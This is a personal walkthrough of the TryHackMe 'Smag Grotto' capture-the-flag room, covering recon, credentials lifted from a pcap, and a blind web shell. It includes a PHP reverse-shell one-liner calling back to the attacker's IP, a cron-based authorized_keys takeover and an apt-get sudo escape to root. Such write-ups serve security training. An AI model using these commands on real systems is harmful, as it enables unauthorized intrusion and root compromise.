---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Smag Grotto
# DESCRIPTION       . Follow the yellow brick road.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/smaggrotto
```

```
sudo nmap -sSVC -T5 -p- 10.10.212.55 -oN smag
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74e0e1b405856a15687e16daf2c76bee (RSA)
|   256 bd4362b9a1865136f8c7dff90f638fa3 (ECDSA)
|_  256 f9e7da078f10af970b3287c932d71b76 (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### PORT 80

- default page only shows us a basic message, with no other information displayed.

```
Welcome to Smag!
This site is still heavily under development, check back soon to see some of the awesome services we offer!
```

- I decided to fuzz this, since the source code didn't reveal any directories.

```
ffuf -u http://10.10.212.55/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

```
mail                    [Status: 301, Size: 311, Words: 20, Lines: 10]
```

- Alright. Here we can find 3 mails, all containing some sort of clues.

- The source code of the `.pcap` file is indicated in the source code of the page, which reveals the `http://10.10.212.55/aW1wb3J0YW50/` directory. 

- Also, along with the `netadmin`, `uzi` and `jake@smag.thm` we also have `trodd@smag.thm`. He is CC'ed in the first email, but this was commented out in the html code.

- I opened the `.pcap` file in `wireshark` and the `fourth packet` got my attention, since it is a login request to `login.php`.

```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=c{REDACTED} HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

- We have the credentials in plaintext. Also, the host is `development.smag.thm`.

- In order to access this, we must add the following entry in `/etc/hosts`

```
MACHIHE_IP     development.smag.thm
```

- We're able to login with the credentials above at `http://development.smag.thm/login.php`

- We got access to a web shell after logging in ; we're able to pass commands in a form and they'll get executed on the server.

- The thing is, I tried basic commands like `ls` or `whoami` and I got no response, so I assumed the response is not returned to the webserver in order to be displayed.

- To test this out, I decided to use `ping` while having `tcpdump` running on my VPN interface on my attack box. If I would receive the `ICMP Echo` packets, it would mean that the commands are indeed executed, but no output is shown.

**LOCAL BOX**

```bash
sudo tcpdump -i <interface> #most probably, tun0 - must be the one used by the VPN.
```

**WEB SERVER**

```bash
ping <yourIP> -c 4
```

**TCP DUMP OUTPUT**

```
23:12:43.680353 IP development.smag.thm > asgard: ICMP echo request, id 908, seq 1, length 64
23:12:43.680379 IP {redacted} > development.smag.thm: ICMP echo reply, id 908, seq 1, length 64
23:12:44.886090 IP development.smag.thm > asgard: ICMP echo request, id 908, seq 2, length 64
23:12:44.886117 IP {redacted} > development.smag.thm: ICMP echo reply, id 908, seq 2, length 64
23:12:45.612199 IP development.smag.thm > asgard: ICMP echo request, id 908, seq 3, length 64
23:12:45.612225 IP {redacted} > development.smag.thm: ICMP echo reply, id 908, seq 3, length 64
23:12:46.934153 IP development.smag.thm > asgard: ICMP echo request, id 908, seq 4, length 64
23:12:46.934206 IP {redacted} > development.smag.thm: ICMP echo reply, id 908, seq 4, length 64
```

- As you can see, `development.smag.thm` is reaching out to us. 

**DISCLAIMER**: Use `-c <number>` to send only a limited amount of packets. If that flag is missing, ping will run until stopped (ctrl + C, but we can't do that) and the entire server will become unresponsive since all it is doing is pinging our host.

- Don't ask how I found out :) 

```
php -r '$sock=fsockopen("10.11.53.46",3131);shell_exec("sh <&3 >&3 2>&3");'
```

- This was my command of choice to get a reverse shell from the webserver. 

- To escalate privileges to the only user on the system, `jake`, I found the following.

```
 * * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

- This is a cron job that copies the content of `/opt/.backups/jake_id_rsa.pub.backup` to the `/home/jake/.ssh/authorized_keys` file in jake directories.

- Whatever public key(s) are in that file, it allows SSH connections using the private pair of the public key.

- I've generated a new public/private pair using `ssh-keygen`.

- Then, I've copied the `key.pub` to `/opt/.backups/jake_id_rsa.pub.backup`

- `echo "<content of key.pub" > /opt/.backups/jake_id_rsa.pub.backup`

- Then, from my host, I used `ssh -i key jake@ip`, where `key` is the private pair of `key.pub`.

- Once logged as `jake`, I could escalate privileges easily using 

```
jake@smag:~$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```

- This works because I've checked `sudo -l` and saw that we're able to run `apt-get` binary as `sudo`. In this case, we're telling it to invoke `/bin/bash` before it executes, and since we're executing as sudo (so root privileges), we're getting a root shell instead.

**NOTE**: if you're wondering where the `apt-get update` command output is, it is in `jake's shell`.

```
root@smag:/tmp# whoami
root
```

- The user flag is in `/home/jake/user.txt`.
- The root flag is in `/root/root.txt`.

